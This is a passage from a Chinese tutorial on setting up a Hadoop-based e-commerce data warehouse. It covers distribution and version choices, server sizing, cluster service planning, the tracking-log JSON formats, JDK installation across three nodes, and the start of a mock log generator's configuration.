1）如何选择Apache/CDH/HDP版本？</p><p>Apache：运维麻烦；组件间兼容性需要自己调研（一般大厂使用，技术实力雄厚，有专业的运维人员）</p><p>CDH：国内使用最多的版本，但是CM不开源。2021年开始收费，一个节点1万美金</p><p>HDP：开源，可以进行二次开发，但是没有CDH稳定，国内使用较少</p><p>  目前CDH和HDP已经合并了。</p><p>2）框架版本参考</p><table><thead><tr><th>产品</th><th>版本</th></tr></thead><tbody><tr><td>Hadoop</td><td>3.1.3</td></tr><tr><td>Flume</td><td>1.9.0</td></tr><tr><td>Kafka</td><td>2.4.1</td></tr><tr><td>Hive</td><td>3.1.2</td></tr><tr><td>Sqoop</td><td>1.4.6</td></tr><tr><td>Java</td><td>1.8</td></tr><tr><td>Zookeeper</td><td>3.5.7</td></tr><tr><td>Presto</td><td>0.189</td></tr></tbody></table><h3 id="2-2-4-服务器选型"><a href="#2-2-4-服务器选型" class="headerlink" title="2.2.4   服务器选型"></a>2.2.4   服务器选型</h3><p>  服务器选择物理机还是云主机？</p><p>1）物理机：</p><p>以128G内存，20核物理CPU，40线程，戴尔品牌单台报价4W出头，一般物理机寿命5年左右。</p><p>需要有专业的运维任意，平均一个月1万。电费也是不少的开销。</p><p>2）云主机：</p><p>以阿里云为例，差不多配置，每年5W。运维工作都有阿里云完成，运维相对较轻松。</p><p>3）企业选择</p><p>金融有限公司和阿里没有直接冲突的公司选择阿里云。</p><p>中小公司，为了融资上市，选择阿里云，拉到融资后买物理机。</p><p>有长期打算，资金比较足，选择物理机。</p><h3 id="2-2-5-集群资源规划设计"><a href="#2-2-5-集群资源规划设计" class="headerlink" title="2.2.5 集群资源规划设计"></a>2.2.5 集群资源规划设计</h3><p>1）如何确认集群规模？（假设服务器8T磁盘，128G内存）</p><p>（1）每天日活跃用户100万，每人一天平均100条：100万*100条=1亿条</p><p>（2）每条日志1k左右，每天1亿条：100000000/1024/1024=约100G</p><p>（3）半年内不扩容服务器来算：100G*180天=约18T</p><p>（4）保留3副本：18T*3=54T</p><p>（5）保留20%-30%buf=54T/0.7=77T</p><p>（6）算到这里：约8T*10台服务器</p><p>2）测试集群服务器规划</p><table><thead><tr><th>服务名称</th><th>子服务</th><th>服务器  hadoop102</th><th>服务器  hadoop103</th><th>服务器  hadoop104</th></tr></thead><tbody><tr><td>HDFS</td><td>NameNode</td><td>√</td><td></td><td></td></tr><tr><td></td><td>DataNode</td><td>√</td><td>√</td><td>√</td></tr><tr><td></td><td>SecondaryNameNode</td><td></td><td></td><td>√</td></tr><tr><td>Yarn</td><td>NodeManager</td><td>√</td><td>√</td><td>√</td></tr><tr><td></td><td>Resourcemanager</td><td></td><td>√</td><td></td></tr><tr><td>Zookeeper</td><td>Zookeeper Server</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Flume(采集日志)</td><td>Flume</td><td>√</td><td>√</td><td></td></tr><tr><td>Kafka</td><td>Kafka</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Flume（消费Kafka）</td><td>Flume</td><td></td><td></td><td>√</td></tr><tr><td>Hive</td><td>Hive</td><td>√</td><td></td><td></td></tr><tr><td>MySQL</td><td>MySQL</td><td>√</td><td></td><td></td></tr><tr><td>Sqoop</td><td>Sqoop</td><td>√</td><td></td><td></td></tr><tr><td>Presto</td><td>Coordinator</td><td>√</td><td></td><td></td></tr><tr><td></td><td>Worker</td><td></td><td>√</td><td>√</td></tr><tr><td>Azkaban</td><td>AzkabanWebServer</td><td>√</td><td></td><td></td></tr><tr><td></td><td>AzkabanExecutorServer</td><td>√</td><td></td><td></td></tr><tr><td>Druid</td><td>Druid</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Kylin</td><td></td><td>√</td><td></td><td></td></tr><tr><td>Hbase</td><td>HMaster</td><td>√</td><td></td><td></td></tr><tr><td></td><td>HRegionServer</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Superset</td><td></td><td>√</td><td></td><td></td></tr><tr><td>Atlas</td><td></td><td>√</td><td></td><td></td></tr><tr><td>Solr</td><td>Jar</td><td>√</td><td></td><td></td></tr><tr><td>服务数总计</td><td></td><td>18</td><td>9</td><td>9</td></tr></tbody></table><h1 id="3-数据生成模块"><a href="#3-数据生成模块" class="headerlink" title="3 数据生成模块"></a>3 数据生成模块</h1><h2 id="3-1-目标数据"><a href="#3-1-目标数据" class="headerlink" title="3.1 目标数据"></a>3.1 目标数据</h2><p>我们要收集和分析的数据主要包括页面数据、事件数据、曝光数据、启动数据和错误数据。</p><h3 id="3-1-1-页面"><a href="#3-1-1-页面" class="headerlink" title="3.1.1 页面"></a>3.1.1 页面</h3><p>页面数据主要记录一个页面的用户访问情况，包括访问时间、停留时间、页面路径等信息。</p><p>​              </p><p>1）所有页面id如下</p><pre class="line-numbers language-bash"><code class="language-bash">home<span class="token punctuation">(</span><span class="token string">"首页"</span><span class="token punctuation">)</span>,category<span class="token punctuation">(</span><span class="token string">"分类页"</span><span class="token punctuation">)</span>,discovery<span class="token punctuation">(</span><span class="token string">"发现页"</span><span class="token punctuation">)</span>,top_n<span class="token punctuation">(</span><span class="token string">"热门排行"</span><span class="token punctuation">)</span>,favor<span class="token punctuation">(</span><span class="token string">"收藏页"</span><span class="token punctuation">)</span>,search<span class="token punctuation">(</span><span class="token string">"搜索页"</span><span class="token punctuation">)</span>,good_list<span class="token punctuation">(</span><span class="token string">"商品列表页"</span><span class="token punctuation">)</span>,good_detail<span class="token punctuation">(</span><span class="token string">"商品详情"</span><span class="token punctuation">)</span>,good_spec<span class="token punctuation">(</span><span class="token string">"商品规格"</span><span class="token punctuation">)</span>,comment<span class="token punctuation">(</span><span class="token string">"评价"</span><span class="token punctuation">)</span>,comment_done<span class="token punctuation">(</span><span class="token string">"评价完成"</span><span class="token punctuation">)</span>,comment_list<span class="token punctuation">(</span><span class="token string">"评价列表"</span><span class="token punctuation">)</span>,cart<span class="token punctuation">(</span><span class="token string">"购物车"</span><span class="token punctuation">)</span>,trade<span class="token punctuation">(</span><span class="token string">"下单结算"</span><span class="token punctuation">)</span>,payment<span class="token punctuation">(</span><span class="token string">"支付页面"</span><span class="token punctuation">)</span>,payment_done<span class="token punctuation">(</span><span class="token string">"支付完成"</span><span class="token punctuation">)</span>,orders_all<span class="token punctuation">(</span><span class="token string">"全部订单"</span><span class="token punctuation">)</span>,orders_unpaid<span class="token punctuation">(</span><span class="token string">"订单待支付"</span><span class="token punctuation">)</span>,orders_undelivered<span class="token punctuation">(</span><span class="token string">"订单待发货"</span><span class="token punctuation">)</span>,orders_unreceipted<span class="token punctuation">(</span><span class="token string">"订单待收货"</span><span class="token punctuation">)</span>,orders_wait_comment<span class="token punctuation">(</span><span class="token string">"订单待评价"</span><span class="token punctuation">)</span>,mine<span class="token punctuation">(</span><span class="token string">"我的"</span><span class="token punctuation">)</span>,activity<span class="token punctuation">(</span><span class="token string">"活动"</span><span class="token punctuation">)</span>,login<span class="token punctuation">(</span><span class="token string">"登录"</span><span class="token punctuation">)</span>,register<span class="token punctuation">(</span><span class="token string">"注册"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）所有页面对象类型如下：</p><pre class="line-numbers language-bash"><code class="language-bash">sku_id<span class="token punctuation">(</span><span class="token string">"商品skuId"</span><span class="token punctuation">)</span>,keyword<span class="token punctuation">(</span><span class="token string">"搜索关键词"</span><span class="token punctuation">)</span>,sku_ids<span class="token punctuation">(</span><span class="token string">"多个商品skuId"</span><span class="token punctuation">)</span>,activity_id<span class="token punctuation">(</span><span class="token string">"活动id"</span><span class="token punctuation">)</span>,coupon_id<span class="token punctuation">(</span><span class="token string">"购物券id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）所有来源类型如下：</p><pre class="line-numbers language-bash"><code class="language-bash">promotion<span class="token punctuation">(</span><span class="token string">"商品推广"</span><span class="token punctuation">)</span>,recommend<span class="token punctuation">(</span><span class="token string">"算法推荐商品"</span><span class="token punctuation">)</span>,query<span class="token punctuation">(</span><span class="token string">"查询结果商品"</span><span class="token punctuation">)</span>,activity<span class="token punctuation">(</span><span class="token string">"促销活动"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-1-2-事件"><a href="#3-1-2-事件" class="headerlink" title="3.1.2 事件"></a>3.1.2 事件</h3><p>事件数据主要记录应用内一个具体操作行为，包括操作类型、操作对象、操作对象描述等信息。</p><p>1）所有动作类型如下：</p><pre class="line-numbers language-bash"><code class="language-bash">favor_add<span class="token punctuation">(</span><span class="token string">"添加收藏"</span><span class="token punctuation">)</span>,favor_canel<span class="token punctuation">(</span><span class="token string">"取消收藏"</span><span class="token punctuation">)</span>,cart_add<span class="token punctuation">(</span><span class="token string">"添加购物车"</span><span class="token punctuation">)</span>,cart_remove<span class="token punctuation">(</span><span class="token string">"删除购物车"</span><span class="token punctuation">)</span>,cart_add_num<span class="token punctuation">(</span><span class="token string">"增加购物车商品数量"</span><span class="token punctuation">)</span>,cart_minus_num<span class="token punctuation">(</span><span class="token string">"减少购物车商品数量"</span><span class="token punctuation">)</span>,trade_add_address<span class="token punctuation">(</span><span class="token string">"增加收货地址"</span><span class="token punctuation">)</span>,get_coupon<span class="token punctuation">(</span><span class="token string">"领取优惠券"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：对于下单、支付等业务数据，可从业务数据库获取。</p><p>2）所有动作目标类型如下：</p><p>sku_id(“商品”),<br>coupon_id(“购物券”);</p><h3 id="3-1-3-曝光"><a href="#3-1-3-曝光" class="headerlink" title="3.1.3 曝光"></a>3.1.3 曝光</h3><p>曝光数据主要记录页面所曝光的内容，包括曝光对象，曝光类型等信息。</p><p>1）所有曝光类型如下：</p><pre class="line-numbers language-bash"><code class="language-bash">promotion<span class="token punctuation">(</span><span class="token string">"商品推广"</span><span class="token punctuation">)</span>,recommend<span class="token punctuation">(</span><span class="token string">"算法推荐商品"</span><span class="token punctuation">)</span>,query<span class="token punctuation">(</span><span class="token string">"查询结果商品"</span><span class="token punctuation">)</span>,activity<span class="token punctuation">(</span><span class="token string">"促销活动"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2）所有曝光对象类型如下：</p><pre class="line-numbers language-bash"><code class="language-bash">sku_id<span class="token punctuation">(</span><span class="token string">"商品skuId"</span><span class="token punctuation">)</span>,activity_id<span class="token punctuation">(</span><span class="token string">"活动id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-1-4-启动"><a href="#3-1-4-启动" class="headerlink" title="3.1.4 启动"></a>3.1.4 启动</h3><p>启动数据记录应用的启动信息。</p><p>1）所有启动入口类型如下：</p><pre class="line-numbers language-bash"><code class="language-bash">icon<span class="token punctuation">(</span><span class="token string">"图标"</span><span class="token punctuation">)</span>,notification<span class="token punctuation">(</span><span class="token string">"通知"</span><span class="token punctuation">)</span>,install<span class="token punctuation">(</span><span class="token string">"安装后启动"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-1-5-错误"><a href="#3-1-5-错误" class="headerlink" title="3.1.5 错误"></a>3.1.5 错误</h3><p>错误数据记录应用使用过程中的错误信息，包括错误编号及错误信息。</p><h2 id="3-2-数据埋点"><a href="#3-2-数据埋点" class="headerlink" title="3.2 数据埋点"></a>3.2 数据埋点</h2><h3 id="3-2-1-主流埋点方式（了解）"><a href="#3-2-1-主流埋点方式（了解）" class="headerlink" title="3.2.1 主流埋点方式（了解）"></a>3.2.1 主流埋点方式（了解）</h3><p>目前主流的埋点方式，有代码埋点（前端/后端）、可视化埋点、全埋点三种。</p><p>代码埋点是通过调用埋点SDK函数，在需要埋点的业务逻辑功能位置调用接口，上报埋点数据。例如，我们对页面中的某个按钮埋点后，当这个按钮被点击时，可以在这个按钮对应的 OnClick 函数里面调用SDK提供的数据发送接口，来发送数据。</p><p>可视化埋点只需要研发人员集成采集 SDK，不需要写埋点代码，业务人员就可以通过访问分析平台的“圈选”功能，来“圈”出需要对用户行为进行捕捉的控件，并对该事件进行命名。圈选完毕后，这些配置会同步到各个用户的终端上，由采集 SDK 按照圈选的配置自动进行用户行为数据的采集和发送。（三方埋点技术：神策大数据，GrowingIO）</p><p>全埋点是通过在产品中嵌入SDK，前端自动采集页面上的全部用户行为事件，上报埋点数据，相当于做了一个统一的埋点。然后再通过界面配置哪些数据需要在系统里面进行分析。</p><h3 id="3-2-2-埋点数据日志结构"><a href="#3-2-2-埋点数据日志结构" class="headerlink" title="3.2.2 埋点数据日志结构"></a>3.2.2 埋点数据日志结构</h3><p>我们的日志结构大致可分为两类，一是普通页面埋点日志，二是启动日志。</p><p>普通页面日志结构如下，每条日志包含了，当前页面的页面信息，所有事件（动作）、所有曝光信息以及错误信息。除此之外，还包含了一系列<strong>公共信息</strong>，包括设备信息，地理位置，应用信息等，即下边的<strong>common</strong>字段。</p><p>1）普通页面埋点日志格式</p><pre class="line-numbers language-json"><code class="language-json">&amp;#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token property">"common"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>                  -- 公共信息    <span class="token property">"ar"</span><span class="token operator">:</span> <span class="token string">"230000"</span><span class="token punctuation">,</span>              -- 地区编码    <span class="token property">"ba"</span><span class="token operator">:</span> <span class="token string">"iPhone"</span><span class="token punctuation">,</span>              -- 手机品牌    <span class="token property">"ch"</span><span class="token operator">:</span> <span class="token string">"Appstore"</span><span class="token punctuation">,</span>            -- 渠道    <span class="token property">"is_new"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>--是否首日使用，首次使用的当日，该字段值为<span class="token number">1</span>，过了<span class="token number">24</span><span class="token operator">:</span><span class="token number">00</span>，该字段置为<span class="token number">0</span>。    <span class="token property">"md"</span><span class="token operator">:</span> <span class="token string">"iPhone 8"</span><span class="token punctuation">,</span>            -- 手机型号    <span class="token property">"mid"</span><span class="token operator">:</span> <span class="token string">"YXfhjAYH6As2z9Iq"</span><span class="token punctuation">,</span> -- 设备id    <span class="token property">"os"</span><span class="token operator">:</span> <span class="token string">"iOS 13.2.9"</span><span class="token punctuation">,</span>          -- 操作系统    <span class="token property">"uid"</span><span class="token operator">:</span> <span class="token string">"485"</span><span class="token punctuation">,</span>                 -- 会员id    <span class="token property">"vc"</span><span class="token operator">:</span> <span class="token string">"v2.1.134"</span>             -- app版本号  &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token property">"actions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                     --动作(事件<span class="token punctuation">)</span>      &amp;#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token property">"action_id"</span><span class="token operator">:</span> <span class="token string">"favor_add"</span><span class="token punctuation">,</span>   --动作id      <span class="token property">"item"</span><span class="token operator">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span>                   --目标id      <span class="token property">"item_type"</span><span class="token operator">:</span> <span class="token string">"sku_id"</span><span class="token punctuation">,</span>       --目标类型      <span class="token property">"ts"</span><span class="token operator">:</span> <span class="token number">1585744376605</span>           --动作时间戳    &amp;#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"displays"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    &amp;#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token property">"displayType"</span><span class="token operator">:</span> <span class="token string">"query"</span><span class="token punctuation">,</span>        -- 曝光类型      <span class="token property">"item"</span><span class="token operator">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span>                     -- 曝光对象id      <span class="token property">"item_type"</span><span class="token operator">:</span> <span class="token string">"sku_id"</span><span class="token punctuation">,</span>         -- 曝光对象类型      <span class="token property">"order"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>                      --出现顺序      <span class="token property">"pos_id"</span><span class="token operator">:</span> <span class="token number">2</span>                      --曝光位置    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    &amp;#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token property">"displayType"</span><span class="token operator">:</span> <span class="token string">"promotion"</span><span class="token punctuation">,</span>      <span class="token property">"item"</span><span class="token operator">:</span> <span class="token string">"6"</span><span class="token punctuation">,</span>      <span class="token property">"item_type"</span><span class="token operator">:</span> <span class="token string">"sku_id"</span><span class="token punctuation">,</span>      <span class="token property">"order"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>       <span class="token property">"pos_id"</span><span class="token operator">:</span> <span class="token number">1</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    &amp;#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token property">"displayType"</span><span class="token operator">:</span> <span class="token string">"promotion"</span><span class="token punctuation">,</span>      <span class="token property">"item"</span><span class="token operator">:</span> <span class="token string">"9"</span><span class="token punctuation">,</span>      <span class="token property">"item_type"</span><span class="token operator">:</span> <span class="token string">"sku_id"</span><span class="token punctuation">,</span>      <span class="token property">"order"</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>       <span class="token property">"pos_id"</span><span class="token operator">:</span> <span class="token number">3</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    &amp;#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token property">"displayType"</span><span class="token operator">:</span> <span class="token string">"recommend"</span><span class="token punctuation">,</span>      <span class="token property">"item"</span><span class="token operator">:</span> <span class="token string">"6"</span><span class="token punctuation">,</span>      <span class="token property">"item_type"</span><span class="token operator">:</span> <span class="token string">"sku_id"</span><span class="token punctuation">,</span>      <span class="token property">"order"</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>       <span class="token property">"pos_id"</span><span class="token operator">:</span> <span class="token number">2</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    &amp;#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token property">"displayType"</span><span class="token operator">:</span> <span class="token string">"query "</span><span class="token punctuation">,</span>      <span class="token property">"item"</span><span class="token operator">:</span> <span class="token string">"6"</span><span class="token punctuation">,</span>      <span class="token property">"item_type"</span><span class="token operator">:</span> <span class="token string">"sku_id"</span><span class="token punctuation">,</span>      <span class="token property">"order"</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">,</span>       <span class="token property">"pos_id"</span><span class="token operator">:</span> <span class="token number">1</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"page"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>                       --页面信息    <span class="token property">"during_time"</span><span class="token operator">:</span> <span class="token number">7648</span><span class="token punctuation">,</span>        -- 持续时间毫秒    <span class="token property">"item"</span><span class="token operator">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span>                  -- 目标id    <span class="token property">"item_type"</span><span class="token operator">:</span> <span class="token string">"sku_id"</span><span class="token punctuation">,</span>      -- 目标类型    <span class="token property">"last_page_id"</span><span class="token operator">:</span> <span class="token string">"login"</span><span class="token punctuation">,</span>    -- 上页类型    <span class="token property">"page_id"</span><span class="token operator">:</span> <span class="token string">"good_detail"</span><span class="token punctuation">,</span>   -- 页面ID    <span class="token property">"sourceType"</span><span class="token operator">:</span> <span class="token string">"promotion"</span>   -- 来源类型  &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token property">"err"</span><span class="token operator">:</span>&amp;#<span class="token number">123</span><span class="token punctuation">;</span>                     --错误<span class="token property">"error_code"</span><span class="token operator">:</span> <span class="token string">"1234"</span><span class="token punctuation">,</span>      --错误码    <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token string">"***********"</span>       --错误信息&amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  <span class="token property">"ts"</span><span class="token operator">:</span> <span class="token number">1585744374423</span>  --跳入时间戳&amp;#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 2）启动日志格式</p><p>启动日志结构相对简单，主要包含公共信息，启动信息和错误信息。</p><pre class="line-numbers language-json"><code class="language-json">&amp;#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token property">"common"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token property">"ar"</span><span class="token operator">:</span> <span class="token string">"370000"</span><span class="token punctuation">,</span>    <span class="token property">"ba"</span><span class="token operator">:</span> <span class="token string">"Honor"</span><span class="token punctuation">,</span>    <span class="token property">"ch"</span><span class="token operator">:</span> <span class="token string">"wandoujia"</span><span class="token punctuation">,</span>    <span class="token property">"is_new"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>    <span class="token property">"md"</span><span class="token operator">:</span> <span class="token string">"Honor 20s"</span><span class="token punctuation">,</span>    <span class="token property">"mid"</span><span class="token operator">:</span> <span class="token string">"eQF5boERMJFOujcp"</span><span class="token punctuation">,</span>    <span class="token property">"os"</span><span class="token operator">:</span> <span class="token string">"Android 11.0"</span><span class="token punctuation">,</span>    <span class="token property">"uid"</span><span class="token operator">:</span> <span class="token string">"76"</span><span class="token punctuation">,</span>    <span class="token property">"vc"</span><span class="token operator">:</span> <span class="token string">"v2.1.134"</span>  &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  <span class="token property">"start"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>       <span class="token property">"entry"</span><span class="token operator">:</span> <span class="token string">"icon"</span><span class="token punctuation">,</span>         --icon手机图标  notice 通知   install 安装后启动    <span class="token property">"loading_time"</span><span class="token operator">:</span> <span class="token number">18803</span><span class="token punctuation">,</span>  --启动加载时间    <span class="token property">"open_ad_id"</span><span class="token operator">:</span> <span class="token number">7</span><span class="token punctuation">,</span>        --广告页ID    <span class="token property">"open_ad_ms"</span><span class="token operator">:</span> <span class="token number">3449</span><span class="token punctuation">,</span>    -- 广告总共播放时间    <span class="token property">"open_ad_skip_ms"</span><span class="token operator">:</span> <span class="token number">1989</span>   --  用户跳过广告时点  &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token property">"err"</span><span class="token operator">:</span>&amp;#<span class="token number">123</span><span class="token punctuation">;</span>                     --错误<span class="token property">"error_code"</span><span class="token operator">:</span> <span class="token string">"1234"</span><span class="token punctuation">,</span>      --错误码    <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token string">"***********"</span>       --错误信息&amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  <span class="token property">"ts"</span><span class="token operator">:</span> <span class="token number">1585744304000</span>&amp;#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-3-埋点数据上报时机"><a href="#3-2-3-埋点数据上报时机" class="headerlink" title="3.2.3 埋点数据上报时机"></a>3.2.3 埋点数据上报时机</h3><p>埋点数据上报时机包括两种方式。</p><p>方式一，在离开该页面时，上传在这个页面产生的所有数据（页面、事件、曝光、错误等）。优点，批处理，减少了服务器接收数据压力。缺点，不是特别及时。</p><p>方式二，每个事件、动作、错误等，产生后，立即发送。优点，响应及时。缺点，对服务器接收数据压力比较大。</p><h2 id="3-3-服务器和JDK准备"><a href="#3-3-服务器和JDK准备" class="headerlink" title="3.3 服务器和JDK准备"></a>3.3 服务器和JDK准备</h2><h3 id="3-3-1-服务器准备"><a href="#3-3-1-服务器准备" class="headerlink" title="3.3.1 服务器准备"></a>3.3.1 服务器准备</h3><p>安装hadoop集群，分别安装hadoop102、hadoop103、hadoop104三台主机。</p><h3 id="3-3-2-阿里云服务器准备（可选）"><a href="#3-3-2-阿里云服务器准备（可选）" class="headerlink" title="3.3.2 阿里云服务器准备（可选）"></a>3.3.2 阿里云服务器准备（可选）</h3><h3 id="3-3-3-JDK准备"><a href="#3-3-3-JDK准备" class="headerlink" title="3.3.3 JDK准备"></a>3.3.3 JDK准备</h3><p>1）卸载现有JDK（3台节点）</p><pre><code>[molly@hadoop102 opt]# sudo rpm -qa | grep -i java | xargs -n1 sudo rpm -e --nodeps[molly@hadoop103 opt]# sudo rpm -qa | grep -i java | xargs -n1 sudo rpm -e --nodeps[molly@hadoop104 opt]# sudo rpm -qa | grep -i java | xargs -n1 sudo rpm -e --nodeps</code></pre><p>2）用SecureCRT工具将JDK导入到hadoop102的/opt/software文件夹下面</p><p>3） “alt+p”进入sftp模式   </p><p>4）选择jdk1.8拖入工具</p><p>5）在Linux系统下的opt目录中查看软件包是否导入成功</p><pre><code>[molly@hadoop102 software]# ls /opt/software/</code></pre><p>看到如下结果：</p><pre><code>jdk-8u212-linux-x64.tar.gz</code></pre><p>6）解压JDK到/opt/module目录下</p><pre><code>[molly@hadoop102 software]# tar -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/</code></pre><p>7）配置JDK环境变量</p><p>​    （1）新建/etc/profile.d/my_env.sh文件</p><pre><code>[molly@hadoop102 module]# sudo vim /etc/profile.d/my_env.sh</code></pre><p>添加如下内容，然后保存（:wq）退出</p><pre class="line-numbers language-sh"><code class="language-sh">#JAVA_HOMEexport JAVA_HOME=/opt/module/jdk1.8.0_212export PATH=$PATH:$JAVA_HOME/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>​    （2）让环境变量生效</p><pre><code>[molly@hadoop102 software]$ source /etc/profile.d/my_env.sh</code></pre><p>8）测试JDK是否安装成功</p><pre><code>[molly@hadoop102 module]# java -version#如果能看到以下结果、则Java正常安装java version &quot;1.8.0_212&quot;</code></pre><p>9）分发JDK </p><pre><code>[molly@hadoop102 module]$ xsync /opt/module/jdk1.8.0_212/</code></pre><p>10）分发环境变量配置文件</p><pre><code>[molly@hadoop102 module]$ sudo /home/molly/bin/xsync /etc/profile.d/my_env.sh</code></pre><p>11）分别在hadoop103、hadoop104上执行source</p><pre><code>[molly@hadoop103 module]$ source /etc/profile.d/my_env.sh[molly@hadoop104 module]$ source /etc/profile.d/my_env.sh</code></pre><h3 id="3-3-4-环境变量配置说明"><a href="#3-3-4-环境变量配置说明" class="headerlink" title="3.3.4 环境变量配置说明"></a>3.3.4 环境变量配置说明</h3><p>Linux的环境变量可在多个文件中配置，如/etc/profile，/etc/profile.d/*.sh，<del>/.bashrc，</del>/.bash_profile等，下面说明上述几个文件之间的关系和区别。</p><p>bash的运行模式可分为login shell和non-login shell。</p><p>例如，我们通过终端，输入用户名、密码，登录系统之后，得到就是一个login shell，而当我们执行以下命令ssh hadoop103 command，在hadoop103执行command的就是一个non-login shell。</p><p>这两种shell的主要区别在于，它们启动时会加载不同的配置文件，login shell启动时会加载/etc/profile，<del>/.bash_profile，</del>/.bashrc，non-login shell启动时会加载~/.bashrc。</p><p>而在加载<del>/.bashrc（实际是</del>/.bashrc中加载的/etc/bashrc）或/etc/profile时，都会执行如下代码片段，</p><p>​      <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637657318225.png" alt="1637657318225"></p><p>因此不管是login shell还是non-login shell，启动时都会加载/etc/profile.d/*.sh中的环境变量。</p><h2 id="3-4-模拟数据"><a href="#3-4-模拟数据" class="headerlink" title="3.4 模拟数据"></a>3.4 模拟数据</h2><h3 id="3-4-1-使用说明"><a href="#3-4-1-使用说明" class="headerlink" title="3.4.1 使用说明"></a>3.4.1 使用说明</h3><p>1）将application.yml、gmall2020-mock-log-2021-01-22.jar、path.json、logback.xml上传到hadoop102的/opt/module/applog目录下</p><p>（1）创建applog路径</p><pre><code>[molly@hadoop102 module]$ mkdir /opt/module/applog</code></pre><p>（2）上传文件</p><p>2）配置文件</p><p>（1）application.yml文件</p><p>可以根据需求生成对应日期的用户行为日志。</p><pre><code>[molly@hadoop102 applog]$ vim application.yml</code></pre><p>修改如下内容</p><pre class="line-numbers language-yml"><code class="language-yml"># 外部配置打开# 外部配置打开logging.config: "./logback.xml"#业务日期mock.date: "2020-06-14"#模拟数据发送模式#mock.type: "http"#mock.type: "kafka"mock.type: "log"#http模式下，发送的地址mock.url: 